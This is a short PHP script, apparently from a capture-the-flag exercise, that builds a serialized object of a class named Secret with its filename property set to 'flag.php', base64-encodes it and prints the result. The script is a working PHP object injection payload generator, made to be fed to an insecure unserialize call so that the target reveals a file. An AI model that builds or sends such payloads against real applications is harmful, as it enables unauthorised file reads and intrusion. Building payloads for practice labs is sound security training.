<?php
class Secret {
    private $filename = 'flag.php';
}
$obj = new Secret();
$payload = base64_encode(serialize($obj));
echo $payload;

?>
